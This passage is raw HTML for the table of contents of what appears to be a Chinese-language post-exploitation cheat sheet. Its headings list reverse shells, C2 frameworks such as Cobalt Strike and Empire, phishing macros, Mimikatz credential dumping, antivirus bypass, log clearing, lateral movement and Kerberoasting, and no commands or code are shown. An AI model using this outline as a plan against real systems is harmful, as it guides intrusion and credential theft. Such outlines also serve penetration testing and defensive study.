href=\"#%E9%98%B2%E7%81%AB%E5%A2%99\">防火墙</a></li>\n<li><a href=\"#%E5%A4%9A%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95\">多用户登录</a></li>\n<li><a href=\"#rdp%E8%BF%9E%E6%8E%A5%E8%AE%B0%E5%BD%95\">RDP 连接记录</a></li>\n<li><a href=\"#%E5%88%A0%E9%99%A4%E7%97%95%E8%BF%B9\">删除痕迹</a></li>\n</ul>\n</li>\n<li><a href=\"#%E7%AB%AF%E5%8F%A3%E6%98%A0%E5%B0%84%E8%BD%AC%E5%8F%91\">端口映射 &amp; 转发</a>\n<ul>\n<li><a href=\"#msf\">MSF</a></li>\n<li><a href=\"#lcxexe\">lcx.exe</a></li>\n<li><a href=\"#ssh\">SSH</a>\n<ul>\n<li><a href=\"#%E6%AD%A3%E5%90%91%E8%BD%AC%E5%8F%91\">正向转发</a></li>\n<li><a href=\"#%E5%8F%8D%E5%90%91%E8%BD%AC%E5%8F%91\">反向转发</a></li>\n</ul>\n</li>\n<li><a href=\"#invoke-socksproxy\">Invoke-SocksProxy</a></li>\n<li><a href=\"#ssf\">SSF</a>\n<ul>\n<li><a href=\"#%E5%8D%95%E5%B1%82%E7%BD%91%E7%BB%9C%E6%AD%A3%E5%90%91%E8%BD%AC%E5%8F%91\">单层网络正向转发</a></li>\n<li><a href=\"#%E5%8D%95%E5%B1%82%E7%BD%91%E7%BB%9C%E5%8F%8D%E5%90%91%E8%BD%AC%E5%8F%91\">单层网络反向转发</a></li>\n</ul>\n</li>\n<li><a href=\"#netsh\">Netsh</a></li>\n<li><a href=\"#iptables\">Iptables</a></li>\n<li><a href=\"#chisel\">chisel </a></li>\n</ul>\n</li>\n<li><a href=\"#%E5%91%BD%E4%BB%A4%E6%8E%A7%E5%88%B6\">命令 &amp; 控制</a>\n<ul>\n<li><a href=\"#interactive-shell\">Interactive shell</a></li>\n<li><a href=\"#script-reverse-shell\">Script reverse shell</a>\n<ul>\n<li><a href=\"#bash\">bash</a></li>\n<li><a href=\"#nc\">nc</a></li>\n<li><a href=\"#telnet\">telnet</a></li>\n<li><a href=\"#php\">php</a></li>\n<li><a href=\"#python\">python</a></li>\n<li><a href=\"#perl\">perl</a></li>\n<li><a href=\"#ruby\">ruby</a></li>\n</ul>\n</li>\n<li><a href=\"#openssl-encrypt-shell\">OpenSSL encrypt shell</a>\n<ul>\n<li><a href=\"#linux\">Linux</a></li>\n<li><a href=\"#windows\">Windows</a></li>\n</ul>\n</li>\n<li><a href=\"#dnscat2\">Dnscat2</a>\n<ul>\n<li><a href=\"#powercat\">Powercat</a></li>\n<li><a href=\"#dnscat2-exe\">Dnscat2 exe</a></li>\n</ul>\n</li>\n<li><a href=\"#dns-txt-command\">DNS TXT Command</a></li>\n<li><a href=\"#powershell\">Powershell</a>\n<ul>\n<li><a href=\"#msfpowershell\">MSF+Powershell</a></li>\n<li><a href=\"#powercat\">Powercat</a></li>\n<li><a href=\"#nishang\">Nishang</a>\n<ul>\n<li><a href=\"#bind-shell\">Bind shell</a></li>\n<li><a href=\"#%E5%8F%8D%E5%90%91shell\">反向 shell</a></li>\n<li><a href=\"#udp%E5%8F%8D%E5%90%91shell\">UDP 反向 shell</a></li>\n<li><a href=\"#https\">HTTPS</a></li>\n<li><a href=\"#icmp\">ICMP</a></li>\n</ul>\n</li>\n<li><a href=\"#base64\">Base64</a></li>\n</ul>\n</li>\n<li><a href=\"#metasploit\">Metasploit</a>\n<ul>\n<li><a href=\"#%E5%B8%B8%E8%A7%84%E4%BD%BF%E7%94%A8\">常规使用</a></li>\n<li><a href=\"#%E6%8A%80%E5%B7%A7%E4%BD%BF%E7%94%A8\">技巧使用</a></li>\n<li><a href=\"#%E6%A8%A1%E5%9D%97\">模块</a>\n<ul>\n<li><a href=\"#auxiliary\">Auxiliary</a></li>\n<li><a href=\"#payload\">Payload</a>\n<ul>\n<li><a href=\"#windows\">Windows</a></li>\n<li><a href=\"#linux\">Linux</a></li>\n<li><a href=\"#macos\">MacOS</a></li>\n<li><a href=\"#web\">Web</a></li>\n<li><a href=\"#android\">Android</a></li>\n<li><a href=\"#shellcode\">shellcode</a></li>\n<li><a href=\"#msf%E8%AE%BE%E7%BD%AE%E7%9B%91%E5%90%AC\">msf 设置监听</a></li>\n</ul>\n</li>\n</ul>\n</li>\n<li><a href=\"#meterpreter\">Meterpreter</a>\n<ul>\n<li><a href=\"#%E4%BA%A4%E4%BA%92\">交互</a></li>\n<li><a href=\"#%E6%8F%90%E6%9D%83\">提权</a></li>\n<li><a href=\"#%E5%91%BD%E4%BB%A4\">命令</a></li>\n<li><a href=\"#%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C\">文件操作</a></li>\n<li><a href=\"#%E5%90%8E%E6%B8%97%E9%80%8F%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81\">后渗透 &amp; 权限维持</a></li>\n<li><a href=\"#%E6%B8%85%E7%90%86%E6%97%A5%E5%BF%97\">清理日志</a></li>\n</ul>\n</li>\n<li><a href=\"#msf%E6%B4%BE%E7%94%9Fcobalt-strike%E5%92%8Cempire\">MSF 派生 Cobalt strike 和 Empire</a>\n<ul>\n<li><a href=\"#%E6%B4%BE%E7%94%9Fempire\">派生 Empire</a></li>\n<li><a href=\"#%E6%B4%BE%E7%94%9Fcobalt-strike\">派生 Cobalt Strike</a></li>\n</ul>\n</li>\n</ul>\n</li>\n<li><a href=\"#empire\">Empire</a>\n<ul>\n<li><a href=\"#%E5%AE%89%E8%A3%85\">安装</a></li>\n<li><a href=\"#%E7%9B%91%E5%90%AC\">监听</a></li>\n<li><a href=\"#%E7%94%9F%E6%88%90\">生成</a></li>\n<li><a href=\"#%E8%BF%9E%E6%8E%A5%E9%9D%B6%E6%9C%BA%E5%8F%8A%E5%85%B6%E4%BB%96%E6%93%8D%E4%BD%9C\">连接靶机及其他操作</a></li>\n<li><a href=\"#%E6%8F%90%E6%9D%83\">提权</a></li>\n<li><a href=\"#%E6%A8%AA%E5%90%91\">横向</a>\n<ul>\n<li><a href=\"#%E4%BB%A4%E7%89%8C%E7%AA%83%E5%8F%96\">令牌窃取</a></li>\n<li><a href=\"#%E4%BC%9A%E8%AF%9D%E6%B3%A8%E5%85%A5\">会话注入</a></li>\n<li><a href=\"#hash%E4%BC%A0%E9%80%92\">Hash 传递</a></li>\n</ul>\n</li>\n<li><a href=\"#%E5%90%8E%E9%97%A8%E6%8C%81%E4%B9%85%E5%8C%96\">后门 &amp; 持久化</a>\n<ul>\n<li><a href=\"#%E6%98%A0%E5%83%8F%E5%8A%AB%E6%8C%81\">映像劫持</a></li>\n<li><a href=\"#%E6%B3%A8%E5%85%A5%E6%B3%A8%E5%86%8C%E8%A1%A8%E5%90%AF%E5%8A%A8%E9%A1%B9\">注入注册表启动项</a></li>\n<li><a href=\"#%E8%AE%A1%E5%88%92%E4%BB%BB%E5%8A%A1\">计划任务</a></li>\n<li><a href=\"#wmi\">WMI</a></li>\n<li><a href=\"#%E6%B3%A8%E5%85%A5ssp\">注入 SSP</a></li>\n</ul>\n</li>\n<li><a href=\"#collection%E4%BF%A1%E6%81%AF%E9%87%87%E9%9B%86\">Collection（信息采集）</a></li>\n<li><a href=\"#code_execution%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C\">Code_execution（代码执行）</a></li>\n<li><a href=\"#credentials%E8%BA%AB%E4%BB%BD%E5%87%AD%E8%AF%81\">Credentials（身份凭证）</a></li>\n<li><a href=\"#exfiltration%E6%95%B0%E6%8D%AE%E7%AA%83%E5%8F%96\">Exfiltration（数据窃取）</a></li>\n<li><a href=\"#exploitation%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8exp\">Exploitation（漏洞利用 EXP）</a></li>\n<li><a href=\"#lateral_movement%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8\">Lateral_movement（横向移动）</a></li>\n<li><a href=\"#management%E7%AE%A1%E7%90%86\">Management（管理）</a></li>\n<li><a href=\"#persistence%E6%8C%81%E4%B9%85%E5%8C%96\">Persistence（持久化）</a></li>\n<li><a href=\"#privesc%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87\">Privesc（权限提升）</a></li>\n<li><a href=\"#recon%E4%BE%A6%E5%AF%9F\">Recon（侦察）</a></li>\n<li><a href=\"#situational_awareness%E6%80%81%E5%8A%BF%E6%84%9F%E7%9F%A5\">Situational_awareness（态势感知）</a></li>\n<li><a href=\"#trollsploit%E6%81%B6%E4%BD%9C%E5%89%A7\">Trollsploit（恶作剧）</a></li>\n<li><a href=\"#empire-word\">Empire Word</a></li>\n<li><a href=\"#empire%E6%B4%BE%E7%94%9Fcobalt-strike%E5%92%8Cmsf\">Empire 派生 Cobalt Strike 和 MSF</a>\n<ul>\n<li><a href=\"#%E6%B4%BE%E7%94%9Fmsf\">派生 MSF</a></li>\n<li><a href=\"#%E6%B4%BE%E7%94%9Fcobalt-strike\">派生 Cobalt Strike</a></li>\n</ul>\n</li>\n</ul>\n</li>\n<li><a href=\"#cobalt-strike\">Cobalt Strike</a>\n<ul>\n<li><a href=\"#%E5%AE%89%E8%A3%85\">安装</a></li>\n<li><a href=\"#%E9%83%A8%E7%BD%B2teamserver\">部署 TeamServer</a></li>\n<li><a href=\"#%E6%A8%A1%E5%9D%97\">模块</a></li>\n<li><a href=\"#%E8%BF%9E%E6%8E%A5\">连接</a></li>\n<li><a href=\"#%E7%9B%91%E5%90%AC%E5%99%A8\">监听器</a></li>\n<li><a href=\"#%E6%94%BB%E5%87%BB%E6%A8%A1%E5%9D%97\">攻击模块</a></li>\n<li><a href=\"#%E8%A7%86%E5%9B%BE%E6%A8%A1%E5%9D%97\">视图模块</a></li>\n<li><a href=\"#%E4%BA%A4%E4%BA%92\">交互</a></li>\n<li><a href=\"#beacon\">Beacon</a></li>\n<li><a href=\"#%E5%85%8B%E9%9A%86%E7%BD%91%E7%AB%99\">克隆网站</a></li>\n<li><a href=\"#office%E5%AE%8F\">office 宏</a></li>\n<li><a href=\"#%E9%92%93%E9%B1%BC%E9%82%AE%E4%BB%B6\">钓鱼邮件</a></li>\n<li><a href=\"#%E5%8A%A0%E8%BD%BD%E8%84%9A%E6%9C%AC\">加载脚本</a></li>\n<li><a href=\"#%E6%B5%8F%E8%A7%88%E5%99%A8%E5%8A%AB%E6%8C%81\">浏览器劫持</a></li>\n<li><a href=\"#%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81\">权限维持</a></li>\n<li><a href=\"#%E6%A8%AA%E5%90%91\">横向</a></li>\n<li><a href=\"#%E9%9A%94%E7%A6%BB%E7%BD%91%E7%BB%9C\">隔离网络</a>\n<ul>\n<li><a href=\"#%E6%9D%83%E9%99%90%E6%9C%BA%E4%B8%AD%E8%BD%AC\">权限机中转</a></li>\n<li><a href=\"#smb_beacon\">SMB_beacon</a></li>\n<li><a href=\"#ssh-login\">SSH login</a></li>\n</ul>\n</li>\n<li><a href=\"#%E4%BB%A3%E7%90%86\">代理</a></li>\n<li><a href=\"#%E9%83%A8%E7%BD%B2vpn\">部署 VPN</a></li>\n<li><a href=\"#cobalt-strike%E6%B4%BE%E7%94%9F-empire%E5%92%8Cmsf\">Cobalt strike 派生 Empire 和 MSF</a>\n<ul>\n<li><a href=\"#%E6%B4%BE%E7%94%9Fempire\">派生 Empire</a></li>\n<li><a href=\"#%E6%B4%BE%E7%94%9Fmsf\">派生 MSF</a></li>\n</ul>\n</li>\n</ul>\n</li>\n<li><a href=\"#jsrat\">JSRat</a></li>\n<li><a href=\"#crackmapexec\">CrackMapExec</a>\n<ul>\n<li><a href=\"#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86\">信息收集</a></li>\n<li><a href=\"#%E7%88%86%E7%A0%B4\">爆破</a></li>\n<li><a href=\"#%E5%8F%AF%E7%94%A8%E6%A8%A1%E5%9D%97\">可用模块</a></li>\n<li><a href=\"#pth\">PTH</a></li>\n<li><a href=\"#%E6%89%A7%E8%A1%8C%E5%91%BD%E4%BB%A4\">执行命令</a></li>\n</ul>\n</li>\n<li><a href=\"#koadic\">koadic</a></li>\n<li><a href=\"#silenttrinity\">SILENTTRINITY</a></li>\n<li><a href=\"#browser-c2\">Browser C2</a></li>\n<li><a href=\"#dropbox-c2\">DropBox C2</a></li>\n<li><a href=\"#gmail-c2\">Gmail C2</a>\n<ul>\n<li><a href=\"#gcat\">Gcat</a></li>\n<li><a href=\"#gdog\">Gdog</a></li>\n</ul>\n</li>\n<li><a href=\"#telegram-c2\">Telegram C2</a></li>\n</ul>\n</li>\n<li><a href=\"#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86\">信息收集</a>\n<ul>\n<li><a href=\"#cmd\">Cmd</a></li>\n<li><a href=\"#wmi\">Wmi</a></li>\n<li><a href=\"#powerview\">PowerView</a></li>\n<li><a href=\"#linux\">Linux</a></li>\n</ul>\n</li>\n<li><a href=\"#http%E6%9C%8D%E5%8A%A1\">HTTP 服务</a></li>\n<li><a href=\"#%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C\">文件操作</a>\n<ul>\n<li><a href=\"#windows%E6%9F%A5%E6%89%BE%E6%96%87%E4%BB%B6\">Windows 查找文件</a></li>\n<li><a href=\"#linux%E6%9F%A5%E6%89%BE%E6%96%87%E4%BB%B6\">Linux 查找文件</a></li>\n<li><a href=\"#%E5%88%9B%E5%BB%BA\">创建</a></li>\n<li><a href=\"#%E5%8E%8B%E7%BC%A9\">压缩</a></li>\n<li><a href=\"#%E8%A7%A3%E5%8E%8B\">解压</a></li>\n<li><a href=\"#%E4%BC%A0%E8%BE%93\">传输</a>\n<ul>\n<li><a href=\"#ftp\">FTP</a></li>\n<li><a href=\"#vbs\">VBS</a></li>\n<li><a href=\"#js\">JS</a></li>\n<li><a href=\"#bitsadmin\">Bitsadmin</a></li>\n<li><a href=\"#powershell\">Powershell </a>\n<ul>\n<li><a href=\"#1\">1</a></li>\n<li><a href=\"#2\">2</a></li>\n<li><a href=\"#3\">3</a></li>\n<li><a href=\"#4\">4</a></li>\n<li><a href=\"#5\">5</a></li>\n</ul>\n</li>\n<li><a href=\"#certutil\">Certutil</a></li>\n<li><a href=\"#python\">Python</a></li>\n<li><a href=\"#perl\">Perl</a></li>\n<li><a href=\"#php\">PHP</a></li>\n<li><a href=\"#curl\">Curl</a></li>\n<li><a href=\"#wget\">wget</a></li>\n<li><a href=\"#nc\">nc </a></li>\n<li><a href=\"#scp\">SCP</a></li>\n</ul>\n</li>\n</ul>\n</li>\n<li><a href=\"#hash%E5%AF%86%E7%A0%81\">Hash &amp; 密码</a>\n<ul>\n<li><a href=\"#%E7%A0%B4%E8%A7%A3%E7%BD%91%E5%9D%80\">破解网址</a></li>\n<li><a href=\"#googlecolab%E7%A0%B4%E8%A7%A3hash\">GoogleColab 破解 hash</a></li>\n<li><a href=\"#%E5%AF%86%E7%A0%81%E7%AD%96%E7%95%A5\">密码策略</a></li>\n<li><a href=\"#%E5%BC%80%E5%90%AFwdigest\">开启 Wdigest </a>\n<ul>\n<li><a href=\"#cmd\">Cmd</a></li>\n<li><a href=\"#powershell\">powershell</a></li>\n<li><a href=\"#meterpreter\">meterpreter</a></li>\n</ul>\n</li>\n<li><a href=\"#getpass\">Getpass</a></li>\n<li><a href=\"#quarkspwdump\">QuarksPwDump</a></li>\n<li><a href=\"#msf\">MSF</a></li>\n<li><a href=\"#empire\">Empire</a></li>\n<li><a href=\"#invoke-dcsync\">Invoke-Dcsync</a></li>\n<li><a href=\"#mimikatz\">Mimikatz</a>\n<ul>\n<li><a href=\"#%E8%B0%83%E7%94%A8mimikatz%E8%BF%9C%E7%A8%8B%E6%8A%93%E5%8F%96\">调用 mimikatz 远程抓取</a></li>\n<li><a href=\"#%E6%A8%AA%E5%90%91%E6%89%B9%E9%87%8F%E6%8A%93hash\">横向批量抓 hash</a>\n<ul>\n<li><a href=\"#schtasks\">Schtasks</a></li>\n<li><a href=\"#wmic\">Wmic</a></li>\n</ul>\n</li>\n<li><a href=\"#%E7%9B%B4%E6%8E%A5%E4%BD%BF%E7%94%A8\">直接使用</a></li>\n<li><a href=\"#powershell-bypass\">Powershell Bypass</a></li>\n<li><a href=\"#net-20\">.net 2.0</a></li>\n<li><a href=\"#net-40-msbuild\">.net 4.0 Msbuild</a></li>\n<li><a href=\"#jscript\">JScript</a></li>\n<li><a href=\"#procdump64mimikatz\">Procdump64+mimikatz</a></li>\n<li><a href=\"#dumpert\">Dumpert</a></li>\n<li><a href=\"#cisco-jabber%E8%BD%AC%E5%82%A8lsass\">Cisco Jabber 转储 lsass</a></li>\n<li><a href=\"#%E7%BB%95%E8%BF%87%E5%8D%A1%E5%B7%B4%E6%96%AF%E5%9F%BA\">绕过卡巴斯基</a></li>\n<li><a href=\"#%E8%BF%9C%E7%A8%8Blsass%E8%BF%9B%E7%A8%8B%E8%BD%AC%E5%82%A8-physmem2profit\">远程 LSASS 进程转储 - Physmem2profit</a></li>\n<li><a href=\"#sqldumpermimikatz\">SqlDumper+mimikatz</a></li>\n<li><a href=\"#mimipenguin\">Mimipenguin</a></li>\n</ul>\n</li>\n<li><a href=\"#%E7%BC%93%E5%AD%98hash%E6%8F%90%E5%8F%96\">缓存 hash 提取</a>\n<ul>\n<li><a href=\"#%E6%B3%A8%E5%86%8C%E8%A1%A8\">注册表</a></li>\n<li><a href=\"#ninjacopy\">Ninjacopy</a></li>\n<li><a href=\"#quarks-pwdump\">Quarks-pwdump</a></li>\n</ul>\n</li>\n<li><a href=\"#%E5%9F%9Fhash%E6%8F%90%E5%8F%96\">域 hash 提取</a>\n<ul>\n<li><a href=\"#ntdsutil\">Ntdsutil</a></li>\n<li><a href=\"#vssadmin\">Vssadmin</a></li>\n<li><a href=\"#impacket\">Impacket</a></li>\n<li><a href=\"#ntdsdumpex\">NTDSDumpex</a></li>\n<li><a href=\"#wmi%E8%B0%83%E7%94%A8vssadmin\">WMI 调用 Vssadmin</a></li>\n<li><a href=\"#powersploit\">PowerSploit</a></li>\n<li><a href=\"#nishang\">Nishang</a></li>\n<li><a href=\"#mimikatz\">Mimikatz</a></li>\n<li><a href=\"#msf\">MSF</a></li>\n</ul>\n</li>\n<li><a href=\"#lazagne\">laZagne</a>\n<ul>\n<li><a href=\"#windows\">windows</a></li>\n<li><a href=\"#linux\">Linux</a></li>\n</ul>\n</li>\n<li><a href=\"#%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF\">敏感信息</a>\n<ul>\n<li><a href=\"#seatbelt\">Seatbelt</a></li>\n<li><a href=\"#vnc%E5%AF%86%E7%A0%81\">VNC 密码</a></li>\n<li><a href=\"#navicat%E4%BF%A1%E6%81%AF\">Navicat 信息</a></li>\n<li><a href=\"#chrome%E4%BF%9D%E5%AD%98%E7%9A%84%E5%AF%86%E7%A0%81\">Chrome 保存的密码</a></li>\n<li><a href=\"#foxmail\">Foxmail</a></li>\n<li><a href=\"#firefox%E4%BF%9D%E5%AD%98%E7%9A%84%E5%AF%86%E7%A0%81\">firefox 保存的密码</a></li>\n<li><a href=\"#securecrt\">SecureCRT</a></li>\n</ul>\n</li>\n</ul>\n</li>\n<li><a href=\"#%E6%A8%AA%E5%90%91\">横向</a>\n<ul>\n<li><a href=\"#%E6%8E%A2%E6%B5%8B%E5%AD%98%E6%B4%BB%E4%B8%BB%E6%9C%BA\">探测存活主机</a>\n<ul>\n<li><a href=\"#forping%E5%91%BD%E4%BB%A4%E6%9F%A5%E8%AF%A2%E5%AD%98%E6%B4%BB%E4%B8%BB%E6%9C%BA\">For+Ping 命令查询存活主机</a></li>\n<li><a href=\"#nbtscan\">NbtScan</a></li>\n<li><a href=\"#nmap\">NMAP</a>\n<ul>\n<li><a href=\"#%E4%BB%A3%E7%90%86nmap%E6%89%AB%E6%8F%8F\">代理 nmap 扫描</a></li>\n</ul>\n</li>\n<li><a href=\"#netdiscover\">NetDiscover</a></li>\n<li><a href=\"#rp-scan\">rp-scan</a></li>\n<li><a href=\"#msf\">MSF</a></li>\n</ul>\n</li>\n<li><a href=\"#%E6%8E%A2%E6%B5%8B%E6%9C%8D%E5%8A%A1%E7%AB%AF%E5%8F%A3\">探测服务 &amp; 端口</a>\n<ul>\n<li><a href=\"#powershell\">Powershell</a>\n<ul>\n<li><a href=\"#powersploit\">Powersploit</a></li>\n<li><a href=\"#nishang\">Nishang </a></li>\n</ul>\n</li>\n<li><a href=\"#smb\">SMB </a>\n<ul>\n<li><a href=\"#msf\">MSF</a></li>\n<li><a href=\"#nmap\">NMAP</a></li>\n<li><a href=\"#cmd\">CMD</a></li>\n</ul>\n</li>\n<li><a href=\"#linux-samba%E6%9C%8D%E5%8A%A1\">Linux Samba 服务</a></li>\n<li><a href=\"#msf\">MSF</a>\n<ul>\n<li><a href=\"#%E7%AB%AF%E5%8F%A3\">端口</a></li>\n<li><a href=\"#%E6%9C%8D%E5%8A%A1\">服务</a></li>\n</ul>\n</li>\n<li><a href=\"#nc\">Nc</a></li>\n<li><a href=\"#masscan\">Masscan</a></li>\n<li><a href=\"#ptscan\">PTScan</a></li>\n<li><a href=\"#cobaltstrikek8-aggressor\">CobaltStrike+K8 Aggressor</a>\n<ul>\n<li><a href=\"#%E5%AD%98%E6%B4%BB%E4%B8%BB%E6%9C%BA\">存活主机</a></li>\n<li><a href=\"#ms17010\">MS17010</a></li>\n<li><a href=\"#%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E4%BF%A1%E6%81%AF\">操作系统信息</a></li>\n<li><a href=\"#%E5%86%85%E7%BD%91%E7%AB%99%E7%82%B9banner%E6%A0%87%E9%A2%98%E6%89%AB%E6%8F%8F\">内网站点 banner、标题扫描</a></li>\n<li><a href=\"#ftp%E7%88%86%E7%A0%B4\">FTP 爆破</a></li>\n<li><a href=\"#wmi%E7%88%86%E7%A0%B4windows%E8%B4%A6%E6%88%B7%E5%AF%86%E7%A0%81\">WMI 爆破 windows 账户密码</a></li>\n<li><a href=\"#%E6%80%9D%E7%A7%91%E8%AE%BE%E5%A4%87%E6%89%AB%E6%8F%8F\">思科设备扫描</a></li>\n<li><a href=\"#%E6%9E%9A%E4%B8%BE%E5%85%B1%E4%BA%AB\">枚举共享</a></li>\n<li><a href=\"#%E6%9E%9A%E4%B8%BEsql-server%E6%95%B0%E6%8D%AE%E5%BA%93\">枚举 SQL SERVER 数据库</a></li>\n</ul>\n</li>\n</ul>\n</li>\n<li><a href=\"#%E6%89%A7%E8%A1%8C%E5%91%BD%E4%BB%A4ipc%E8%AE%A1%E5%88%92%E4%BB%BB%E5%8A%A1\">执行命令 &amp; IPC &amp; 计划任务</a>\n<ul>\n<li><a href=\"#at\">AT</a></li>\n<li><a href=\"#schtasks\">Schtasks</a></li>\n<li><a href=\"#wmic\">WMIC</a></li>\n</ul>\n</li>\n<li><a href=\"#%E5%BF%AB%E9%80%9F%E5%AE%9A%E4%BD%8D%E5%9F%9F%E7%AE%A1%E7%90%86%E7%99%BB%E8%BF%87%E7%9A%84%E6%9C%BA%E5%99%A8\">快速定位域管理登过的机器</a></li>\n<li><a href=\"#msf%E6%B7%BB%E5%8A%A0%E8%B7%AF%E7%94%B1\">MSF 添加路由</a></li>\n<li><a href=\"#msf%E7%AE%A1%E9%81%93%E7%9B%91%E5%90%AC\">MSF 管道监听</a></li>\n<li><a href=\"#%E4%BB%A3%E7%90%86\">代理</a>\n<ul>\n<li><a href=\"#ssh\">SSH</a>\n<ul>\n<li><a href=\"#%E6%AD%A3%E5%90%91%E4%BB%A3%E7%90%86\">正向代理</a></li>\n<li><a href=\"#%E5%8F%8D%E5%90%91%E4%BB%A3%E7%90%86\">反向代理</a></li>\n<li><a href=\"#ssh%E9%9A%A7%E9%81%93rc4%E5%8F%8C%E9%87%8D%E5%8A%A0%E5%AF%86\">SSH 隧道 + rc4 双重加密</a></li>\n<li><a href=\"#%E5%85%AC%E7%BD%91ssh%E9%9A%A7%E9%81%93local-msf\">公网 SSH 隧道 + Local MSF</a></li>\n</ul>\n</li>\n<li><a href=\"#socks4a\">socks4a</a></li>\n<li><a href=\"#socks5\">socks5</a></li>\n<li><a href=\"#%E5%9F%BA%E4%BA%8Eweb%E7%9A%84socks5\">基于 web 的 socks5 </a>\n<ul>\n<li><a href=\"#regeorg\">reGeorg</a></li>\n<li><a href=\"#neo-regeorg\">Neo-reGeorg</a></li>\n<li><a href=\"#abptts%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91\">ABPTTS 端口转发</a></li>\n<li><a href=\"#tunna%E8%BD%AC%E5%8F%91\">Tunna 转发</a></li>\n</ul>\n</li>\n<li><a href=\"#earthworm\">Earthworm</a>\n<ul>\n<li><a href=\"#%E6%AD%A3%E5%90%91%E7%9B%AE%E6%A0%87%E6%9C%BA%E5%AD%98%E5%9C%A8%E5%A4%96%E7%BD%91ip\">正向 (目标机存在外网 IP)：</a></li>\n<li><a href=\"#%E5%8F%8D%E5%BC%B9socks5%E7%9B%AE%E6%A0%87%E6%9C%BA%E6%97%A0%E5%A4%96%E7%BD%91ip\">反弹 socks5 (目标机无外网 IP)：</a></li>\n<li><a href=\"#%E4%BA%8C%E7%BA%A7%E7%8E%AF%E5%A2%83a%E6%9C%89%E5%A4%96%E7%BD%91b%E5%86%85%E7%BD%91%E6%97%A0%E5%A4%96%E7%BD%91\">二级环境 (A 有外网，B 内网无外网)：</a></li>\n<li><a href=\"#%E4%BA%8C%E7%BA%A7%E7%8E%AF%E5%A2%83a%E6%97%A0%E5%A4%96%E7%BD%91b%E5%86%85%E7%BD%91%E6%97%A0%E5%A4%96%E7%BD%91\">二级环境 (A 无外网，B 内网无外网)：</a></li>\n<li><a href=\"#%E4%B8%89%E7%BA%A7%E7%8E%AF%E5%A2%83a%E6%97%A0%E5%A4%96%E7%BD%91b%E5%86%85%E7%BD%91%E6%97%A0%E5%A4%96%E7%BD%91%E9%80%9Aac%E9%80%9Ab\">三级环境 (A 无外网，B 内网无外网通 A,C 通 B)：</a></li>\n</ul>\n</li>\n<li><a href=\"#frp\">Frp </a></li>\n<li><a href=\"#ssf\">SSF</a>\n<ul>\n<li><a href=\"#%E6%AD%A3%E5%90%91socks%E4%BB%A3%E7%90%86\">正向 socks 代理</a></li>\n<li><a href=\"#%E5%8F%8D%E5%90%91socks%E4%BB%A3%E7%90%86\">反向 socks 代理</a></li>\n<li><a href=\"#%E5%A4%9A%E7%BA%A7%E7%BA%A7%E8%81%94\">多级级联</a></li>\n<li><a href=\"#%E5%8F%8D%E5%BC%B9shell\">反弹 shell</a></li>\n</ul>\n</li>\n<li><a href=\"#shadowsocks\">Shadowsocks</a></li>\n<li><a href=\"#goproxy\">Goproxy</a></li>\n<li><a href=\"#chisel\">Chisel</a></li>\n<li><a href=\"#%E4%BB%A3%E7%90%86%E8%BD%AF%E4%BB%B6\">代理软件</a></li>\n</ul>\n</li>\n<li><a href=\"#ngrok%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F\">Ngrok 内网穿透</a></li>\n<li><a href=\"#ms17-010\">MS17-010</a></li>\n<li><a href=\"#ms08_067\">MS08_067</a></li>\n<li><a href=\"#%E6%94%BB%E5%87%BBmysql%E6%95%B0%E6%8D%AE%E5%BA%93\">攻击 MySQL 数据库</a></li>\n<li><a href=\"#%E6%94%BB%E5%87%BBmssql%E6%95%B0%E6%8D%AE%E5%BA%93\">攻击 MSSQL 数据库</a></li>\n<li><a href=\"#%E9%9A%94%E7%A6%BB%E4%B8%BB%E6%9C%BApayload\">隔离主机 payload</a></li>\n<li><a href=\"#%E7%88%86%E7%A0%B4\">爆破</a>\n<ul>\n<li><a href=\"#hydra\">Hydra</a></li>\n<li><a href=\"#medusa\">Medusa</a></li>\n<li><a href=\"#%E5%9F%9F%E5%86%85%E7%88%86%E7%A0%B4\">域内爆破</a>\n<ul>\n<li><a href=\"#kerbrute\">Kerbrute</a></li>\n<li><a href=\"#domainpasswordspray\">DomainPasswordSpray</a></li>\n</ul>\n</li>\n</ul>\n</li>\n<li><a href=\"#%E6%96%B9%E7%A8%8B%E5%BC%8F%E5%86%85%E7%BD%91%E4%B8%8D%E4%BA%A7%E7%94%9Fsession\">方程式内网不产生 session</a></li>\n<li><a href=\"#kerberoasting\">Kerberoasting</a>\n<ul>\n<li><a href=\"#spn%E5%8F%91%E7%8E%B0\">SPN 发现</a>\n<ul>\n<li><a href=\"#cmd\">cmd</a></li>\n<li><a href=\"#powershell\">Powershell</a></li>\n<li><a href=\"#empire\">Empire</a></li>\n</ul>\n</li>\n<li><a href=\"#%E7%94%B3%E8%AF%B7%E7%A5%A8%E6%8D%AE\">申请票据</a></li>\n<li><a href=\"#%E5%AF%BC%E5%87%BA%E7%A5%A8%E6%8D%AE\">导出票据</a></li>\n<li><a href=\"#%E7%A0%B4%E8%A7%A3%E5%AF%86%E7%A0%81\">破解密码</a></li>\n<li><a href=\"#%E9%87%8D%E5%86%99%E7%A5%A8%E6%8D%AE\">重写票据</a></li>\n<li><a href=\"#getuserspns\">GetUserSPNs</a></li>\n</ul>\n</li>\n<li><a href=\"#aseproasting\">ASEPRoasting</a></li>\n<li><a href=\"#pass-the-hash\">PASS-THE-HASH</a>\n<ul>\n<li><a href=\"#wmiexec--thehash\">WMIExec &amp; TheHash</a></li>\n<li><a href=\"#wmi\">WMI</a>\n<ul>\n<li><a href=\"#wmiexecpy\">wmiexec.py</a></li>\n<li><a href=\"#wmiexecvbs\">wmiexec.vbs</a></li>\n<li><a href=\"#powershell\">Powershell</a></li>\n</ul>\n</li>\n<li><a href=\"#psexec\">Psexec</a></li>\n<li><a href=\"#mimikatz\">Mimikatz</a></li>\n<li><a 